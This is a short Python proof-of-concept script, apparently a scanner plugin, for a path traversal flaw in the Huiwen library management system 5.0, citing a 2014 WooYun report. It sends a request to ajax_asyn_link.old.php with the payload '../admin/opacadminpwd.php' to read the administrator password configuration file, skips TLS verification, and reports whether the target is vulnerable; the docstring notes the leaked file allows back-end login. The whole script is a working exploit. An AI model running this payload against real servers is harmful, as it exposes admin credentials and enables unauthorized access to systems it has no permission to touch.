#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 汇文软件图书管理系统ajax_asyn_link.old.php任意文件读取
referer: http://www.wooyun.org/bugs/wooyun-2014-059850
author: Lucifer
description: 漏洞影响5.0版本,漏洞文件位于ajax_asyn_link.old.php中,参数url可以传入"../"来读取配置文件，并成功登陆到后台。
'''
import sys
import requests
import warnings
def run(url):
        result=['','不存在']
        payload = "/zplug/ajax_asyn_link.old.php?url=../admin/opacadminpwd.php"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"<?php" in req.text:
                result[1]=  '存在'
                result[0] = vulnurl
            else:
                result[1]=  '不存在'

        except:
            result[1]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    